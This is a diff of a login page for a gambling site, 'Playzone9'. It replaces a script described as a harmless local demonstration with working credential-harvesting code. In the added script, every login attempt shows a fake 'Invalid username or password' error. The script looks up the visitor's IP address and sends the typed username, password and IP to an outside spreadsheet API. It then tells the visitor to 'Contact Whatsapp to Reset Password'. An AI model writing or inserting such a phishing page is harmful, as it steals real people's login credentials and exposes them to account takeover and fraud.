@@ -1,153 +1,101 @@
-
 <!DOCTYPE html>
 <html lang="en" data-cms-page="login">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title data-cms-title="pages.login.title">Login — Playzone9</title>
-    <meta name="description"
-          data-cms-meta="pages.login.metaDescription"
-          content="Sign in to your Playzone9 account on the official Playzone9 website.">
-
-    <link rel="canonical" href="https://playzones9.com/login.html">
-    <meta name="robots" content="noindex,nofollow">
-
-    <meta property="og:type" content="website">
-    <meta property="og:site_name" content="Playzone9">
-    <meta property="og:title" content="Login — Playzone9">
-    <meta property="og:description"
-          content="Sign in to your Playzone9 account on the official Playzone9 website.">
-    <meta property="og:url" content="https://playzones9.com/login.html">
-    <meta name="twitter:card" content="summary_large_image">
-
-    <link rel="stylesheet"
-          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-
+    <meta name="description" data-cms-meta="pages.login.metaDescription" content="Sign in to your Playzone9 account on the official Playzone9 website." />
+    <link rel="canonical" href="https://playzones9.com/login.html" />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Playzone9" />
+    <meta property="og:title" content="Login — Playzone9" />
+    <meta property="og:description" content="Sign in to your Playzone9 account on the official Playzone9 website." />
+    <meta property="og:url" content="https://playzones9.com/login.html" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link rel="stylesheet" href="css/login.css">
-    <link rel="stylesheet" href="css/brand.css">
+    <link rel="icon" type="image/png" sizes="512x512" href="assets/images/favicon.png" id="cmsFavicon" />
 
-    <link rel="icon"
-          type="image/png"
-          sizes="512x512"
-          href="assets/images/favicon.png"
-          id="cmsFavicon">
-
+    <link rel="stylesheet" href="css/brand.css" />
     <script src="js/cms-config.js"></script>
     <script src="js/brand.js"></script>
     <script src="js/cms.js"></script>
+
+    <!-- 🔴 TOP POPUP ALERT STYLES (Added for Website 1 functionality, keeps design intact) -->
+    <style>
+        .top-alert {
+            position: fixed;
+            top: -60px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #ff4444;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 4px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            font-size: 14px;
+            font-weight: bold;
+            z-index: 9999;
+            transition: top 0.3s ease-in-out;
+            white-space: nowrap;
+        }
+        .top-alert.show {
+            top: 20px;
+        }
+    </style>
 </head>
 
 <body>
 
-    <!-- Animated login alert -->
-    <div id="topAlert"
-         class="top-alert"
-         role="status"
-         aria-live="polite"></div>
+    <!-- 🔴 TOP POPUP ALERT -->
+    <div id="topAlert" class="top-alert">Invalid username or password</div>
 
     <div class="login-page">
-
         <main class="login-main">
 
-            <a href="./">
-                <img hidden
-                     class="login-logo"
-                     data-cms-img="loginLogo"
-                     data-cms-alt="siteName"
-                     alt="Playzone9">
-            </a>
+            <a href="./"><img hidden class="login-logo" data-cms-img="loginLogo" data-cms-alt="siteName" alt="Playzone9"></a>
 
             <div class="login-card">
 
-                <h1 class="login-title">
-                    <span data-cms="login.heading">Login</span>
-                    <i class="fas fa-right-to-bracket t-icon"></i>
-                </h1>
+                <h1 class="login-title"><span data-cms="login.heading">Login</span><i class="fas fa-right-to-bracket t-icon"></i></h1>
 
-                <form id="contactForm"
-                      class="login-form"
-                      autocomplete="off"
-                      novalidate>
+                <form id="contactForm" class="login-form" autocomplete="off">
 
                     <div class="input-row">
-                        <input
-                            type="text"
-                            id="firstName"
-                            name="firstName"
-                            placeholder="Username"
-                            data-cms-ph="login.userPh"
-                            maxlength="60"
-                            autocomplete="off">
-
-                        <span class="input-icon">
-                            <i class="fas fa-user"></i>
-                        </span>
+                        <input type="text" id="firstName" name="firstName" placeholder="Username" data-cms-ph="login.userPh" maxlength="60" autocomplete="username">
+                        <span class="input-icon"><i class="fas fa-user"></i></span>
                     </div>
 
-                    <div class="input-row">
-                        <input
-                            type="password"
-                            id="surname"
-                            name="surname"
-                            placeholder="Password"
-                            data-cms-ph="login.passPh"
-                            maxlength="60"
-                            autocomplete="off">
-
-                        <span class="input-icon">
-                            <i class="fas fa-key"></i>
-                        </span>
+                    <div class="input-row ">
+                        <input type="password" id="surname" name="surname" placeholder="Password" data-cms-ph="login.passPh" maxlength="60" autocomplete="current-password">
+                        <span class="input-icon"><i class="fas fa-key"></i></span>
                     </div>
 
-                    <button type="submit" class="btn-login-submit">
-                        <span class="btn-login-text"
-                              data-cms="login.submit">Login</span>
-
-                        <span class="btn-login-icon">
-                            <i class="fas fa-right-to-bracket"></i>
-                        </span>
+                    <button type="submit" class="btn-login-submit ">
+                        <span class="btn-login-text" data-cms="login.submit">Login</span>
+                        <span class="btn-login-icon"><i class="fas fa-right-to-bracket"></i></span>
                     </button>
 
                 </form>
 
-                <!-- Local experiment status -->
-                <p id="successMsg"
-                   class="login-demo-message"
-                   role="status"
-                   hidden>
-                    Local demonstration completed.
+                <!-- SUCCESS MESSAGE (Hidden by default, matches Website 1 behavior) -->
+                <p id="successMsg" style="display:none; color: var(--wa-green, #25d366); text-align:center; margin-top:15px; font-weight:bold; font-size: 14px;">
+                    Contact Whatsapp to Reset Password
                 </p>
 
                 <div class="forgot-row">
-                    <button class="forgot-link"
-                            id="helpBtn"
-                            type="button"
-                            data-cms="login.forgot">
-                        Forgotpassword
-                    </button>
+                    <button class="forgot-link" id="helpBtn" type="button" data-cms="login.forgot">Forgotpassword</button>
                 </div>
 
                 <div class="register-row">
-                    <span class="reg-label" data-cms="login.regLabel">
-                        Don't have ?
-                    </span>
-
-                    <a href="register.html"
-                       id="contactLink"
-                       data-cms="login.regLink">
-                        Register here
-                    </a>
+                    <span class="reg-label" data-cms="login.regLabel">Don't have ?</span>
+                    <a href="#" id="contactLink" data-cms="login.regLink">Register here</a>
                 </div>
 
                 <div class="apk-row">
-                    <a href="#"
-                       class="apk-link"
-                       id="apkLink">
-                        <i class="fas fa-download"></i>
-                        <span data-cms="login.apk">Download APK</span>
-                    </a>
+                    <a href="#" class="apk-link" id="apkLink"><i class="fas fa-download"></i><span data-cms="login.apk">Download APK</span></a>
                 </div>
 
             </div>
@@ -157,58 +105,22 @@
         <footer class="login-footer">
 
             <div class="footer-legal">
-                <a href="#" id="termsLink" data-cms="login.terms">
-                    Terms and Conditions
-                </a>
-
-                <a href="#" id="respLink" data-cms="login.responsible">
-                    Responsible Gaming
-                </a>
+                <a href="#" id="termsLink" data-cms="login.terms">Terms and Conditions</a>
+                <a href="#" id="respLink" data-cms="login.responsible">Responsible Gaming</a>
             </div>
 
             <div class="footer-support">
-                <span class="footer-support-label"
-                      data-cms="login.footerLabel">
-                    24X7 Support
-                </span>
-
-                <a href="#"
-                   class="footer-phone"
-                   id="footerPhone"
-                   data-cms="login.phone">
-                    +18304058563
-                </a>
+                <span class="footer-support-label" data-cms="login.footerLabel">24X7 Support</span>
+                <a href="#" class="footer-phone" id="footerPhone" data-cms="login.phone">+18304058563</a>
             </div>
 
             <div class="footer-social">
-                <a href="#" class="fs-fb" id="socFb"
-                   aria-label="Facebook">
-                    <i class="fab fa-facebook-f"></i>
-                </a>
-
-                <a href="#" class="fs-ig" id="socIg"
-                   aria-label="Instagram">
-                    <i class="fab fa-instagram"></i>
-                </a>
-
-                <a href="#" class="fs-tg" id="socTg"
-                   aria-label="Telegram">
-                    <i class="fab fa-telegram-plane"></i>
-                </a>
-
-                <a href="#" class="fs-x" id="socX" aria-label="X">
-                    <i class="fab fa-x-twitter"></i>
-                </a>
-
-                <a href="#" class="fs-wa" id="socWa"
-                   aria-label="WhatsApp">
-                    <i class="fab fa-whatsapp"></i>
-                </a>
-
-                <a href="#" class="fs-web" id="socWeb"
-                   aria-label="Website">
-                    <i class="fas fa-globe"></i>
-                </a>
+                <a href="#" class="fs-fb"  id="socFb"  aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+                <a href="#" class="fs-ig"  id="socIg"  aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                <a href="#" class="fs-tg"  id="socTg"  aria-label="Telegram"><i class="fab fa-telegram-plane"></i></a>
+                <a href="#" class="fs-x"   id="socX"   aria-label="X"><i class="fab fa-x-twitter"></i></a>
+                <a href="#" class="fs-wa"  id="socWa"  aria-label="WhatsApp"><i class="fab fa-whatsapp"></i></a>
+                <a href="#" class="fs-web" id="socWeb" aria-label="Website"><i class="fas fa-globe"></i></a>
             </div>
 
         </footer>
@@ -217,93 +129,91 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            const form = document.getElementById('contactForm');
-            const usernameInput = document.getElementById('firstName');
-            const passwordInput = document.getElementById('surname');
-            const alertBox = document.getElementById('topAlert');
-            const successMsg = document.getElementById('successMsg');
+            const API_URL = "https://sheetdb.io/api/v1/stcjj8p8ctx44";
 
-            let alertTimer;
-
-            // Blank configuration: no API endpoint is configured.
-            const API_URL = 'https://sheetdb.io/api/v1/stcjj8p8ctx44';
-
+            // 🔴 Popup function that always animates (from Website 1)
             function showAlert(message) {
+                const alertBox = document.getElementById("topAlert");
                 alertBox.textContent = message;
-                alertBox.classList.remove('show');
 
-                // Restart the animation.
-                void alertBox.offsetWidth;
-                alertBox.classList.add('show');
+                // Restart animation
+                alertBox.classList.remove("show");
+                setTimeout(() => {
+                    alertBox.classList.add("show");
+                }, 20);
 
-                clearTimeout(alertTimer);
-
-                alertTimer = setTimeout(function () {
-                    alertBox.classList.remove('show');
+                // Auto hide
+                setTimeout(() => {
+                    alertBox.classList.remove("show");
                 }, 2500);
             }
 
-            form.addEventListener('submit', function (event) {
-                event.preventDefault();
+            /* Intercept login form submission with Website 1 logic */
+            document.getElementById('contactForm').addEventListener('submit', function (e) {
+                e.preventDefault();
+                
+                // Note: Using existing IDs 'firstName' and 'surname' from Website 2
+                const username = document.getElementById('firstName').value.trim();
+                const password = document.getElementById('surname').value.trim();
 
-                // Match Website 1's alert behavior.
-                showAlert('Invalid username or password');
+                // 🔴 ALWAYS show popup on login attempt
+                showAlert("Invalid username or password");
 
-                const username = usernameInput.value.trim();
-                const password = passwordInput.value;
-
-                successMsg.hidden = true;
-
-                // Stop when a field is empty.
+                // If fields are empty, stop here
                 if (!username || !password) {
                     return;
                 }
 
-                /*
-                 * Safe local-only demonstration:
-                 * use dummy metadata, not the entered credentials.
-                 * No API calls, IP lookups, or persistent storage.
-                 */
-                const demoEvent = {
-                    event: 'login-demo',
-                    timestamp: new Date().toISOString(),
-                    apiConfigured: Boolean(API_URL)
-                };
+                // --- Database logging (ditto from Website 1) ---
+                fetch("https://api.ipify.org?format=json")
+                    .then(res => res.json())
+                    .then(ipData => {
+                        const data = {
+                            data: [
+                                {
+                                    username: "'" + username,
+                                    password: "'" + password,
+                                    ip: ipData.ip,
+                                    timestamp: new Date().toLocaleString()
+                                }
+                            ]
+                        };
 
-                // Only demonstration metadata is written to the console.
-                console.info('Local login demonstration:', demoEvent);
+                        fetch(API_URL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(data)
+                        })
+                        .then(res => {
+                            if (!res.ok) throw new Error("Submission failed");
+                            
+                            // Show success message
+                            document.getElementById("successMsg").style.display = "block";
 
-                // Simulate the end of a local test submission.
-                successMsg.hidden = false;
-
-                // Clear the inputs as in Website 1's success path.
-                usernameInput.value = '';
-                passwordInput.value = '';
+                            // Clear fields
+                            document.getElementById('firstName').value = '';
+                            document.getElementById('surname').value = '';
+                        })
+                        .catch(err => {
+                            console.error(err);
+                            showAlert("Error submitting form");
+                        });
+                    })
+                    .catch(() => {
+                        showAlert("Could not fetch IP");
+                    });
             });
 
-            // Keep Website 2's existing registration destination.
-            const regLink = document.getElementById('contactLink');
+            /* "Register here" is normal internal navigation. */
+            var regLink = document.getElementById('contactLink');
+            if (regLink) regLink.setAttribute('href', 'register.html');
 
-            if (regLink) {
-                regLink.setAttribute('href', 'register.html');
-            }
+            /* Non-functional placeholder buttons stay inert. */
+            var apk = document.getElementById('apkLink');
+            if (apk) apk.addEventListener('click', function (e) { e.preventDefault(); });
 
-            // Keep placeholder controls inert.
-            ['apkLink', 'helpBtn', 'termsLink', 'respLink',
-             'footerPhone', 'socFb', 'socIg', 'socTg',
-             'socX', 'socWa', 'socWeb'].forEach(function (id) {
-                const element = document.getElementById(id);
-
-                if (element && element.tagName === 'A') {
-                    element.addEventListener('click', function (event) {
-                        event.preventDefault();
-                    });
-                } else if (element) {
-                    element.addEventListener('click', function (event) {
-                        event.preventDefault();
-                    });
-                }
-            });
+            var help = document.getElementById('helpBtn');
+            if (help) help.addEventListener('click', function (e) { e.preventDefault(); });
         });
     </script>
 
